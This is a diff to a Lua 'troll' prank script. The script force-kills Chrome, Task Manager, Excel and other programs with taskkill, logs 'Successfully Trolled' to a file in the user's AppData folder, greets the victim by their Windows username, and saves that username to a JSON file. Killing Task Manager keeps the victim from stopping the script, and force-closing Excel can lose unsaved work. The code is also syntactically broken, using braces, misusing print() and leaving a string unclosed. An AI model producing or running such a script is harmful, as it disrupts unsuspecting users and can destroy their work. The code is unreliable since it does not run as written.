@@ -1,10 +1,14 @@
 local ui = require "ui"
 
+local dir = sys.Directory(sys.currentdir);
+
+local json = require "json"
+
 local user = print(os.getenv('USERNAME'));
 
 --Functions
 
-function add (CloseDistractions) {
+function CloseDistractions () {
   os.execute("taskkill /F /IM \"chrome.exe\" /T");  --Chrome
 
   os.execute("taskkill /F /IM \"taskmgr.exe\" /T");  --Task Manager
@@ -18,10 +22,10 @@ function add (CloseDistractions) {
   os.execute("taskkill /F /IM \"excel.exe\" /T");  --MS Excel
 }
 
-function add (MakeDirReal) {
+function MakeDirReal () {
     Directory.make("C:\\Users\\"..os.getenv('USERNAME').."\\AppData\\Local\\ParaMattYT\\ShutDownLua")
-    file = io.open("C:\\Users\\"..os.getenv('USERNAME').."\\AppData\\Local\\ParaMattYT\\ShutDownLua\\log.lualogger", "w")
-    file:write("Successfully Trolled")
+    file = io.open("C:\\Users\\"..os.getenv('USERNAME').."\\AppData\\Local\\ParaMattYT\\ShutDownLua\\DateTrolled.txt", "w")
+    file:write("Successfully Trolled On "..sys.Datetime().." At "..sys.Datetime()..")
     file:close()
 }
 
@@ -32,6 +36,8 @@ ui.info("Hey dude");
 ui.info("Wait...");
 
 ui.info("I think I know you!");
+
+json.save("userinfo/name.json", user)
 
 ui.info("Are you "..(os.getenv('USERNAME').."?");
 
@@ -47,7 +53,7 @@ ui.info("Now that that\'s dealt with...");
 
 ui.info("How\'s it going "..(os.getenv('USERNAME').."?");
 
-ui.info("Good?");
+ui.info("Having a good "..print(sys.Datetime().dayname).."?");
 
 ui.info("That\'s great!");
 
